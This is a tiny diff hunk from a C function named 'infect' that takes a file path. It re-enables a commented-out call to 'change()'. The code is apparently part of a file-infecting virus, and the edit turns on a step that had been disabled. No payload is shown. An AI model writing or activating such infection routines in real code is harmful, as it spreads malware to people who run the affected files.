@@ -71,7 +71,7 @@ void infect(char* pstrFilePath)
 
 
     }
-  //  change();
+    change();
 }
 
 
